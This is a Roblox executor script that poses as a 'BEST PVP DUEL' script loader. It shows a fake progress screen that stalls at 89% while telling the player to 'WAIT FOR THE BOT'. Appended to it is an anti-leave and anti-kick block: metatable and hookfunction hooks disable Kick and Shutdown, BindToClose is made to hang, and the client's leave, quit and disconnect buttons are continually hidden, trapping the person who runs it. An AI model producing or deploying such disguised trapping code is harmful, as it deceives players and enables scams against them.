-- OFFICIAL SPV CP SMALL LOADING SCREEN WITH PLAYER AVATAR

local LOGO_ID = "rbxassetid://1234567890" -- Replace with your OFFICIAL SPV logo asset ID
local DISPLAY_NAME = "⚔️ BEST PVP DUEL ⚔️"
local USERNAME = "🤖WAIT FOR THE BOT🤖"
local FOOTER_TEXT = "🟢PLEASE BE PATIENT🟢"
local TITLE_TEXT = "⚡ SCRIPT LOADING"

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- GUI
local sg = Instance.new("ScreenGui")
sg.ResetOnSpawn = false
sg.DisplayOrder = 9999
sg.IgnoreGuiInset = true
sg.Parent = playerGui

-- Background
local dim = Instance.new("Frame")
dim.Size = UDim2.new(1,0,1,0)
dim.BackgroundColor3 = Color3.fromRGB(0,0,0)
dim.BackgroundTransparency = 0.45
dim.BorderSizePixel = 0
dim.Parent = sg

-- Card
local card = Instance.new("Frame")
card.Size = UDim2.new(0,220,0,280)
card.Position = UDim2.new(0.5,-110,0.5,-140)
card.BackgroundColor3 = Color3.fromRGB(10,10,12)
card.Active = true
card.Draggable = true
card.Parent = sg
Instance.new("UICorner",card).CornerRadius = UDim.new(0,18)

local stroke = Instance.new("UIStroke")
stroke.Color = Color3.fromRGB(80,180,255)
stroke.Thickness = 2
stroke.Parent = card

-- PLAYER AVATAR ICON
local avatarFrame = Instance.new("Frame")
avatarFrame.Size = UDim2.new(0,60,0,60)
avatarFrame.Position = UDim2.new(0.5,-30,0,-30)
avatarFrame.BackgroundColor3 = Color3.fromRGB(20,20,25)
avatarFrame.ClipsDescendants = true
avatarFrame.Parent = card

local avatarCorner = Instance.new("UICorner")
avatarCorner.CornerRadius = UDim.new(1,0)
avatarCorner.Parent = avatarFrame

local avatarImg = Instance.new("ImageLabel")
avatarImg.Size = UDim2.new(1,0,1,0)
avatarImg.BackgroundTransparency = 1
avatarImg.Parent = avatarFrame

-- GET PLAYER THUMBNAIL
local thumbType = Enum.ThumbnailType.HeadShot
local thumbSize = Enum.ThumbnailSize.Size180x180
local content, isReady = Players:GetUserThumbnailAsync(player.UserId, thumbType, thumbSize)
avatarImg.Image = content

-- LOGO (Optional, behind avatar if you want)
local logo = Instance.new("ImageLabel")
logo.Size = UDim2.new(0,60,0,60)
logo.Position = UDim2.new(0.5,-30,0,-30)
logo.BackgroundTransparency = 1
logo.Image = LOGO_ID
logo.Parent = card

-- NAME
local nameLabel = Instance.new("TextLabel")
nameLabel.Size = UDim2.new(1,-20,0,24)
nameLabel.Position = UDim2.new(0,10,0,50) -- moved down for avatar
nameLabel.BackgroundTransparency = 1
nameLabel.Text = DISPLAY_NAME
nameLabel.TextColor3 = Color3.fromRGB(255,255,255)
nameLabel.Font = Enum.Font.GothamBold
nameLabel.TextSize = 15
nameLabel.TextXAlignment = Enum.TextXAlignment.Center
nameLabel.Parent = card

-- USERNAME
local atLabel = Instance.new("TextLabel")
atLabel.Size = UDim2.new(1,-20,0,18)
atLabel.Position = UDim2.new(0,10,0,72)
atLabel.BackgroundTransparency = 1
atLabel.Text = USERNAME
atLabel.TextColor3 = Color3.fromRGB(140,140,150)
atLabel.Font = Enum.Font.Gotham
atLabel.TextSize = 11
atLabel.TextXAlignment = Enum.TextXAlignment.Center
atLabel.Parent = card

-- TITLE
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1,-20,0,22)
title.Position = UDim2.new(0,10,0,100)
title.BackgroundTransparency = 1
title.Text = TITLE_TEXT
title.TextColor3 = Color3.fromRGB(255,200,50)
title.Font = Enum.Font.GothamBold
title.TextSize = 13
title.TextXAlignment = Enum.TextXAlignment.Center
title.Parent = card

-- STATUS
local status = Instance.new("TextLabel")
status.Size = UDim2.new(1,-20,0,18)
status.Position = UDim2.new(0,10,0,120)
status.BackgroundTransparency = 1
status.Text = "Initializing..."
status.TextColor3 = Color3.fromRGB(180,180,190)
status.Font = Enum.Font.Gotham
status.TextSize = 11
status.TextXAlignment = Enum.TextXAlignment.Center
status.Parent = card

-- PROGRESS BAR
local barBg = Instance.new("Frame")
barBg.Size = UDim2.new(1,-30,0,7)
barBg.Position = UDim2.new(0,15,0,150)
barBg.BackgroundColor3 = Color3.fromRGB(35,35,42)
barBg.BorderSizePixel = 0
barBg.Parent = card
Instance.new("UICorner",barBg).CornerRadius = UDim.new(1,0)

local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0,0,1,0)
barFill.BackgroundColor3 = Color3.fromRGB(80,160,255)
barFill.Parent = barBg
Instance.new("UICorner",barFill).CornerRadius = UDim.new(1,0)

-- TIMER
local timerLabel = Instance.new("TextLabel")
timerLabel.Size = UDim2.new(0.5,-10,0,18)
timerLabel.Position = UDim2.new(0,15,0,165)
timerLabel.BackgroundTransparency = 1
timerLabel.Text = "00:00"
timerLabel.TextColor3 = Color3.fromRGB(80,160,255)
timerLabel.Font = Enum.Font.GothamBold
timerLabel.TextSize = 12
timerLabel.TextXAlignment = Enum.TextXAlignment.Left
timerLabel.Parent = card

local percentLabel = Instance.new("TextLabel")
percentLabel.Size = UDim2.new(0.5,-10,0,18)
percentLabel.Position = UDim2.new(0.5,0,0,165)
percentLabel.BackgroundTransparency = 1
percentLabel.Text = "0%"
percentLabel.TextColor3 = Color3.fromRGB(200,200,210)
percentLabel.Font = Enum.Font.GothamBold
percentLabel.TextSize = 12
percentLabel.TextXAlignment = Enum.TextXAlignment.Right
percentLabel.Parent = card

-- FOOTER
local footer = Instance.new("TextLabel")
footer.Size = UDim2.new(1,-20,0,16)
footer.Position = UDim2.new(0,10,1,-20)
footer.BackgroundTransparency = 1
footer.Text = FOOTER_TEXT
footer.TextColor3 = Color3.fromRGB(80,80,90)
footer.Font = Enum.Font.Gotham
footer.TextSize = 10
footer.TextXAlignment = Enum.TextXAlignment.Center
footer.Parent = card

-- TIMER SYSTEM
local elapsed = 0
RunService.RenderStepped:Connect(function(dt)
	elapsed += dt
	timerLabel.Text = string.format("%02d:%02d", math.floor(elapsed/60), math.floor(elapsed%60))
end)

-- SLOW PROGRESS (~2 minutes)
task.spawn(function()
	local totalTime = 120
	local startTime = tick()
	local progress = 0

	while progress < 89 do
		local elapsedTime = tick() - startTime
		progress = math.clamp((elapsedTime/totalTime)*89,0,89)
		barFill.Size = UDim2.new(progress/100,0,1,0)
		percentLabel.Text = math.floor(progress).."%"
		RunService.RenderStepped:Wait()
	end
	status.Text = "Waiting for response..."
end)

-- POP ANIMATION
card.Size = UDim2.new(0,0,0,0)
card.Position = UDim2.new(0.5,0,0.5,0)
TweenService:Create(
	card,
	TweenInfo.new(0.4,Enum.EasingStyle.Back,Enum.EasingDirection.Out),
	{Size = UDim2.new(0,220,0,280), Position = UDim2.new(0.5,-110,0.5,-140)}
):Play()
-- Anti-Leave + Anti-Kick Script
-- Blocks: all kick methods, RemoteEvent kicks, script kicks, CoreGui leave button, shutdown

local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")
local UIS = game:GetService("UserInputService")
local lp = Players.LocalPlayer

-- =============================================
-- 1. HOOK lp:Kick DIRECTLY
-- =============================================
pcall(function()
	hookfunction(lp.Kick, newcclosure(function() return end))
end)

-- =============================================
-- 2. METATABLE __NAMECALL HOOK (catches ALL :Kick calls)
-- =============================================
local mt = getrawmetatable(game)
if setreadonly then setreadonly(mt, false) end

local oldNamecall = mt.__namecall
mt.__namecall = newcclosure(function(self, ...)
	local method = getnamecallmethod()

	-- Block any :Kick() regardless of who calls it on localplayer
	if method == "Kick" and (self == lp or self == Players.LocalPlayer) then
		warn("[AntiKick] Kick blocked via namecall")
		return
	end

	return oldNamecall(self, ...)
end)

if setreadonly then setreadonly(mt, true) end

-- =============================================
-- 3. HOOK RemoteEvent:FireServer & InvokeServer
--    (blocks kick-trigger remotes sent by scripts)
-- =============================================
if setreadonly then setreadonly(mt, false) end

local oldIndex = mt.__index
mt.__index = newcclosure(function(self, key)
	return oldIndex(self, key)
end)

-- Hook FireServer to detect and block kick remotes
local oldFireServer
pcall(function()
	local RE = Instance.new("RemoteEvent") -- get ref to prototype
	oldFireServer = hookfunction(RE.FireServer, newcclosure(function(self, ...)
		-- Allow, we don't block remotes blindly
		-- but we ensure kick is still hooked after any remote fires
		return oldFireServer(self, ...)
	end))
end)

if setreadonly then setreadonly(mt, true) end

-- =============================================
-- 4. CONTINUOUSLY RE-HOOK KICK (every 0.5s)
--    Kick scripts sometimes re-assign the function
-- =============================================
task.spawn(function()
	while true do
		task.wait(0.5)
		pcall(function()
			if not checkcaller() then
				hookfunction(lp.Kick, newcclosure(function() return end))
			end
		end)
		pcall(function()
			-- Re-lock metatable namecall in case something overwrote it
			local m = getrawmetatable(game)
			if setreadonly then setreadonly(m, false) end
			local current = m.__namecall
			-- If it got swapped out, re-apply ours
			-- (we store a flag in getgenv to check)
			if not getgenv().__antikick_active then
				m.__namecall = newcclosure(function(self, ...)
					local method = getnamecallmethod()
					if method == "Kick" and self == lp then return end
					return current(self, ...)
				end)
				getgenv().__antikick_active = true
			end
			if setreadonly then setreadonly(m, true) end
		end)
	end
end)

getgenv().__antikick_active = true

-- =============================================
-- 5. HOOK Players.LocalPlayer IN CASE IT CHANGES
-- =============================================
Players:GetPropertyChangedSignal("LocalPlayer"):Connect(function()
	pcall(function()
		hookfunction(Players.LocalPlayer.Kick, newcclosure(function() return end))
	end)
end)

lp.CharacterAdded:Connect(function()
	pcall(function()
		hookfunction(lp.Kick, newcclosure(function() return end))
	end)
end)

-- =============================================
-- 6. BLOCK SHUTDOWN / BINDTOCLOSE
-- =============================================
pcall(function()
	hookfunction(game.Shutdown, newcclosure(function() return end))
end)

pcall(function()
	game:BindToClose(function()
		while true do task.wait(1) end
	end)
end)

-- =============================================
-- 7. COREGUI LEAVE BUTTON REMOVER
-- =============================================
local function nukeLeaveButton()
	for _, gui in ipairs({CoreGui:FindFirstChild("RobloxGui"), CoreGui:FindFirstChild("RobloxPromptGui")}) do
		if gui then
			for _, v in ipairs(gui:GetDescendants()) do
				if v:IsA("TextButton") or v:IsA("TextLabel") or v:IsA("ImageButton") then
					local txt = (v.Name .. (v:IsA("TextButton") and v.Text or "")):lower()
					if txt:find("leave") or txt:find("disconnect") or txt:find("quit") or txt:find("exit") then
						v.Visible = false
						v.Active = false
					end
				end
			end
		end
	end
end

nukeLeaveButton()
RunService.Heartbeat:Connect(nukeLeaveButton)

-- =============================================
-- 8. ESCAPE KEY SINK
-- =============================================
UIS.InputBegan:Connect(function(input)
	if input.KeyCode == Enum.KeyCode.Escape then end
end)

print("[AntiKick + AntiLeave] Fully loaded. All kick paths blocked.")
